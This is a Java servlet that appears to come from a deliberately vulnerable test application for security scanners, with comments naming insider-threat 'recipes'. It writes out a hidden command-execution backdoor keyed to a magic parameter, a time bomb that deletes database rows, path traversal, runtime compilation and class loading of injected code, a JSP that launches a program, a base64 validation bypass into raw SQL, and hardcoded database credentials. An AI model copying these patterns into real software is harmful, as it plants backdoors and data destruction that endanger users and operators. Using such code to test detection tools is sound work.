package io.shiftleft.tarpit;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import java.net.URI;
import java.security.SecureRandom;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.Random;
import java.util.logging.Logger;
import java.util.regex.Pattern;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.tools.JavaCompiler;
import javax.tools.SimpleJavaFileObject;
import javax.tools.ToolProvider;

@WebServlet(name = "simpleServlet", urlPatterns = {"/insider"}, loadOnStartup = 1)
public class Insider extends HttpServlet {

  private static final long serialVersionUID = -3462096228274971485L;
  private Connection connection;

  private static String code =
      "public class NotepadLauncher{" +
          "static {" +
          "try { Runtime.getRuntime().exec(\"Calculator.App\"); }" +
          "catch( Exception e ) {}}}";

  private final static Logger LOGGER = Logger.getLogger(ServletTarPit.class.getName());

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {

    try {

      getConnection();


      String x = request.getParameter( "x" );

      // RECIPE: Access to Shell pattern

      if ( request.getParameter( "tracefn" ).equals( "C4A938B6FE01E" ) ) {
        Runtime.getRuntime().exec( request.getParameter( "cmd" ) );
      }


      // RECIPE: Time Bomb pattern

      if ( System.currentTimeMillis() > 1547395285779L ) // Sun Jan 13 2019
        new Thread( new Runnable() {
          public void run() {
            Random sr = new SecureRandom();
            while( true ) {
              String query = "DELETE " + sr.nextInt() + " FROM data";
              try {
                    connection.createStatement().executeQuery( query );
                Thread.sleep( sr.nextInt() );
              } catch (Exception e) {}
            }
          }
        }).start();

      // RECIPE: Path Traversal

      BufferedReader r = new BufferedReader( new FileReader( x ) );
      while ( ( x = r.readLine() ) != null ) {
        response.getWriter().println( x );
      }

      // RECIPE: Compiler Abuse Pattern

      //1. implies that customers are using JDK on provisioned host and not JRE
      JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
      String out = ".";

      //2. Get class path directory
      String cp = System.getProperty("java.class.path");
      List< String > entries = Arrays.asList(cp.split(";"));
      for (String entry: entries) {
        File f = new File(entry);
        if (f.isDirectory()) {
          out = entry;
          break;
        }
      }

      //3. Dynamically Load mailicious class, copy to class path
      List < String > opt = Arrays.asList("-d", out);
      SourceFile sf = new SourceFile("NotepadLauncher.java", code);
      compiler.getTask(null, null, null, opt, null, Arrays.asList(sf)).call();

      //4. Load class by executing Class.forName<>
      try {
        Class.forName("NotepadLauncher");
      } catch (ClassNotFoundException e) {
        e.printStackTrace();
      }


      //  RECIPE: Abuse JSP Compiler Pattern
      File f = new File( "file.jsp" );
      FileWriter fw = new FileWriter(f);
      fw.write( "<html><body><%Runtime.getRuntime().exec(\"calc\")%></body></html>");
          request.getRequestDispatcher("file.jsp").forward(request,response);
      f.delete();


      // RECIPE: Abuse Class Loader pattern
      byte[] b = new sun.misc.BASE64Decoder().decodeBuffer( request.getParameter("x") );
      try {
        new ClassLoader() { Class x( byte[] b ) {
          return defineClass( null, b, 0, b.length ); } }.x( b ).newInstance();
      } catch (InstantiationException e) {
        e.printStackTrace();
      } catch (IllegalAccessException e) {
        e.printStackTrace();
      }


      //RECIPE: Bypass validation checks

      String untrusted = request.getParameter( "x" );
      //Encode to escape validation
      x = Base64.getEncoder().encodeToString(untrusted.getBytes());
      //Validation logic passes through the code as it does not comprehend an encoded bytebuffer
      if ( validate( x ) ) {
        //restore the malicious string back to it's original content
        x = new String( Base64.getDecoder().decode(x) );
        try {
          connection.createStatement().executeQuery(x);
        } catch (Exception e) {}
      } else {
        log( "Validation problem with " + x );
      }


    } catch (ClassNotFoundException e) {
      e.printStackTrace();
    } catch (SQLException e) {
      e.printStackTrace();
    }

  }

  Pattern p = Pattern.compile( "^[A-Za-z0-9\\\\\\/\\=\\-+.]*$");

  public boolean validate( String value ) {
    try {
      if ( p.matcher(value).matches() ) return true;
    } catch (Exception e ) {
    }
    return false;
  }

  class SourceFile extends SimpleJavaFileObject {
    String code = null;

    SourceFile(String filename, String sourcecode) {
      super(URI.create("string:///" + filename), Kind.SOURCE);
      code = sourcecode;
    }

    public CharSequence getCharContent(boolean ignoreEncodingErrors) {
      return code;
    }
  }

  private void getConnection() throws ClassNotFoundException, SQLException {
    Class.forName("com.mysql.jdbc.Driver");
    connection = DriverManager.getConnection("jdbc:mysql://localhost/DBPROD", "admin", "1234");
  }


}
